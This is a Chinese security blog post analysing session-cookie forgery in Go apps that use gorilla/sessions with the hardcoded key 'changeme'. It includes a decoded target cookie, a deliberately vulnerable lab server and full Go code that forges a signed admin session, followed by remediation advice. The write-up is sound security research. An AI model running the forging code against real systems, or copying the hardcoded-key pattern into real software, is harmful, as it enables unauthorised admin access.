---
title: "Golang 中 Gorilla/sessions 的会话伪造风险分析与复现"
slug: golang-gorilla-session-forgery-analysis
date: 2025-05-21T12:10:24+08:00
source: yuque/penetration
---

一次挺寻常的测试流程，项目跑在 Go 上，用的是大家常见的 Gorilla/sessions 管理 session……

# 背景
首先就发现 cookie 可 base64 解码，而且还可被 2 次解码……



![](https://cdn.nlark.com/yuque/0/2025/png/166008/1747825417253-8441f12b-f947-41a4-a35b-6e3433230875.png)

这个 Cookie 是一个典型的 [gorilla/sessions](https://github.com/gorilla/sessions) 的加密 `CookieStore` 会话值，格式上符合：

```plain
<timestamp>|<base64-encoded-session-data>|<MAC>
```

其中：

+ 第1部分是时间戳
+ 第2部分是 gob 编码的 session 值再 base64 编码；
+ 第3部分是 HMAC-SHA 签名，用来验证数据完整性；
+ 如果我们知道密钥（例如这个项目的硬编码 `"changeme"`），就可以**解码/伪造/修改 session**。



B64 解码，得到

```plain
1747798569|DX8EAQL_gAABEAEQAABk_4AAAQZzdHJpbmcMCwAJYXV0aF91c2VyCSp3ZWIuVXNlcv-BAwEBBFVzZXIB_4IAAQQBAklkAQwAAQhGdWxsTmFtZQEMAAEFRW1haWwBDAABDUF1dGhlbnRpY2F0ZWQBAgAAACf_giQBBWFkbWluAQVhZG1pbgERYWRtaW5AZXhhbXBsZS5jb20BAQA=|ΨVɯlDۇSY5aI0ǎߌڷӃݮŃQ
```

<font style="color:#DF2A3F;">红色部分</font>，时间戳

1747798569

<font style="color:#74B602;">绿色部分</font>，再次 base64 解码，得到

+ 部分可读的 Id、email 字段
+ 估计用不常见的序列化方式

![](https://cdn.nlark.com/yuque/0/2025/png/166008/1747800944480-98cba594-252b-4ee0-a59f-6217b4dd9c17.png)



原本没抱什么希望，但在翻开源代码和请求细节时，意外瞥见了一处让我停下来的地方 —— 默认配置用的居然是个明文的硬编码密钥，"changeme"，这……不搞一搞都说不过去。

```dockerfile
Set-Cookie: token=MTc0Nzc5ODU2OXxEWDhFQVFMX2dBQUJFQUVRQUFCa180QUFBUVp6ZEhKcGJtY01Dd0FKWVhWMGFGOTFjMlZ5Q1NwM1pXSXVWWE5sY3YtQkF3RUJCRlZ6WlhJQl80SUFBUVFCQWtsa0FRd0FBUWhHZFd4c1RtRnRaUUVNQUFFRlJXMWhhV3dCREFBQkRVRjFkR2hsYm5ScFkyRjBaV1FCQWdBQUFDZl9naVFCQldGa2JXbHVBUVZoWkcxcGJnRVJZV1J0YVc1QVpYaGhiWEJzWlM1amIyMEJBUUE9fK6oVokvbES7R1MbEVk1YUkwpw6fTJq304Pdbg6lQ1EB; Path=/; 
```



于是我顺着这个点，开始了复现与深入的流程。

---

# session 签名机制与 gob 编码
先捋一下背景。Gorilla/sessions 这库用得真是广，背后依赖的是 securecookie 模块，主打一个 cookie 内部数据签名（可以加密，但默认没开）。

最简单的用法长这样：



```go
store := sessions.NewCookieStore([]byte("changeme"))
```

意思很明确：用 HMAC-SHA 算法对 cookie 做签名，但密钥写死在代码里，一旦泄漏，就等于把签名系统的命门给了人。



而一旦你在 session 里塞的是结构体（比如用户信息），事情就变得危险了。攻击者完全可以构造出一模一样的结构体，然后自己签一个 session 出来。

---

# 实战：伪造 admin 身份，直通后台
我们搭了个后端靶场来跑实验

+ 创建项目：`go mod init sessweb`
+ 调整版本到跟目标环境一致：`require github.com/gorilla/securecookie v1.1.1`
+ 运行：`go run main.go`

```go
package main

import (
	"encoding/gob"
	"fmt"
	"html/template"
	"log"
	"net/http"

	"github.com/gorilla/sessions"
)

type User struct {
	Username      string
	Authenticated bool
	IsAdmin       bool
}

var (
	hashKey  = []byte("changeme")
	store    = sessions.NewCookieStore(hashKey)
	sessName = "vmango"
	sessKey  = "auth_user"
	// 模拟数据库中的账号密码
	validUsers = map[string]struct {
		Password string
		IsAdmin  bool
	}{
		"admin": {"password123", true},
		"user":  {"userpass", false},
	}
)

func init() {
	gob.Register(&User{})
}

func main() {
	http.HandleFunc("/", handleIndex)
	http.HandleFunc("/login", handleLoginForm)
	http.HandleFunc("/do_login", handleLogin)
	http.HandleFunc("/admin", handleAdmin)

	log.Println("Server running at http://localhost:9091")
	http.ListenAndServe(":9091", nil)
}

func handleIndex(w http.ResponseWriter, r *http.Request) {
	sess, _ := store.Get(r, sessName)
	user, _ := sess.Values["user"].(*User)
	tmpl := `<h1>Index Page</h1>
	{{if .}}Hello, {{.Username}}! <a href='/admin'>Go to Admin</a>{{else}}<a href='/login'>Login</a>{{end}}`
	t := template.Must(template.New("index").Parse(tmpl))
	t.Execute(w, user)
}

func handleLoginForm(w http.ResponseWriter, r *http.Request) {
	tmpl := `<h1>Login</h1>
	<form action='/do_login' method='POST'>
	Username: <input name='username'><br>
	Password: <input type='password' name='password'><br>
	<input type='submit' value='Login'>
	</form>`
	w.Write([]byte(tmpl))
}

func handleLogin(w http.ResponseWriter, r *http.Request) {
	r.ParseForm()
	username := r.FormValue("username")
	password := r.FormValue("password")

	entry, ok := validUsers[username]
	if !ok || entry.Password != password {
		http.Error(w, "Invalid credentials", http.StatusUnauthorized)
		return
	}

	sess, _ := store.Get(r, sessName)
	user := &User{
		Username:      username,
		Authenticated: true,
		IsAdmin:       entry.IsAdmin,
	}
	sess.Values["user"] = user
	sess.Save(r, w)
	fmt.Fprintf(w, "Logged in as %s. <a href='/'>Home</a>", username)
}

func handleAdmin(w http.ResponseWriter, r *http.Request) {
	sess, _ := store.Get(r, sessName)
	fmt.Printf("handleAdmin: %v\n", sess)   // 有
	user, ok := sess.Values["user"].(*User) // 无
	fmt.Printf("user: %v\n", user)
	if !ok || !user.Authenticated || !user.IsAdmin {
		http.Error(w, "Forbidden", http.StatusForbidden)
		return
	}
	fmt.Fprintf(w, "<h1>Admin Page</h1>Welcome, %s!", user.Username)
}
```



登录后，服务端会把类似这样的内容塞进 session：

```go
sess.Values["user"] = &User{
    Username: "admin",
    Authenticated: true,
    IsAdmin: true,
}
```

Cookie 名叫 `vmango`，结构体用 gob 编码，密钥还是那个经典的 "changeme"。

所以我们只要：

1. 注册一下结构体；
2. 构造数据；
3. 用同样的密钥做签名。



然后……复制粘贴到浏览器里，访问 `/admin`，果然就进去了。

```go
gob.Register(&User{})
data := map[interface{}]interface{}{
    "user": &User{
        Username: "admin",
        Authenticated: true,
        IsAdmin: true,
    },
}
cookie, _ := securecookie.Encode("vmango", data, securecookie.CodecsFromPairs([]byte("changeme"))...)
```

签名验证通过，逻辑照旧走，无需爆破，无需注入，就这么优雅（或者说致命）地完成了未授权访问。

![](https://cdn.nlark.com/yuque/0/2025/png/166008/1747824610602-906bd3d7-2b2c-4dec-b69a-959c92844434.png)

![](https://cdn.nlark.com/yuque/0/2025/png/166008/1747824594160-b83d6999-11a3-4828-b09c-00bc8c5e3db0.png)



完整生成 cookie 的利用代码如下

```go
package main

import (
    "encoding/gob"
    "fmt"

    "github.com/gorilla/securecookie" // We'll use this directly
)

// User struct as defined in the original application
type User struct {
    Username      string
    Authenticated bool
    IsAdmin       bool
}

var (
    // THE SECRET KEY - this must match the server's key
    hashKey    = []byte("changeme")
    sessName   = "auth_user" // The name of the session cookie (used by securecookie)
    cookie_key = "vmango"
    // Initialize a SecureCookie instance.
    // The first key is for authentication (HMAC), the second (nil here) would be for encryption.
    // Since the original code only provided one key to NewCookieStore, there's no encryption.
    sc = securecookie.New(hashKey, nil)
)

func init() {
    // Register the User type with gob so it can be serialized/deserialized
    // This is essential for securecookie's default gob serializer.``
    gob.Register(&User{})
}

func main() {

    // Create the admin user object
    session_key := "user"
    value := &User{
        Username:      "admin",
        Authenticated: true,
        IsAdmin:       true,
    }
    sign_a_cookie(session_key, value)
}

func sign_a_cookie(Key string, Value interface{}) string {
    struct_user := make(map[interface{}]interface{})
    struct_user[Key] = Value
    // Use securecookie.Decode to deserialize and verify the cookie value.
    // The 'sessName' is passed as the cookie name, which securecookie might use internally.
    codecs := securecookie.CodecsFromPairs(hashKey)
    output, _ := securecookie.EncodeMulti(cookie_key, &struct_user, codecs...)

    fmt.Println(output)
    return output
}
```



签名的核心逻辑，可参考：[https://github.com/gorilla/securecookie/blob/v1.1.1/securecookie.go#L282](https://github.com/gorilla/securecookie/blob/v1.1.1/securecookie.go#L282)

---

# 为什么有些环境复现失败了？
当然，在一些真实系统里，这个套路走不通，原因也不难猜：

+ 有人用了双密钥机制，加密 + 签名双保险，也就是使用了 block_key
            + ![](https://cdn.nlark.com/yuque/0/2025/png/166008/1747824706928-ea0d7552-7374-48d6-b62f-ebfb8103fc57.png)
+ gob 编码会校验结构体路径和字段顺序，不一致就直接解不了；
+ Cookie 名不一致，或 key 写错，导致无法命中；



换句话说，虽然我们验证了问题存在，但现实中是否能利用，还得看运气和环境配置。



---

# 风险总结
1. HMAC 密钥硬编码，攻击者能伪造签名，合法性直接拿捏
2. session 存结构体，gob 编码可被攻击者构造，实现任意字段伪造
3. 未开启加密存储，明文内容暴露，敏感字段裸奔



---

# 修复建议
1. 密钥别写死！放环境变量，或者接入密钥管理系统；
2. session 里别塞结构体，丢个 user_id 就够了，后续查数据库就行；
3. 开启加密存储，少一层可读性多一层安全；
4. 后台加点认证机制，比如 IP 白名单或二次验证。

---



# 小结
这次案例，再次彰显一个老生常谈但总是被忽视的问题：默认配置有毒。



回过头，其实Flask 早就出现了这种攻击，甚至还有工具：[https://github.com/Paradoxis/Flask-Unsign](https://github.com/Paradoxis/Flask-Unsign)

> 命令行工具，用于通过猜测密钥来获取、解码、暴力破解和制作 Flask 应用程序的会话 cookie。 
>



而在Golang gorilla中，中间那段 gob 编码、securecookie 编码、结构体重构、签名生成，看上去复杂，其实只是实现不同，逻辑完全相同——换汤不换药。

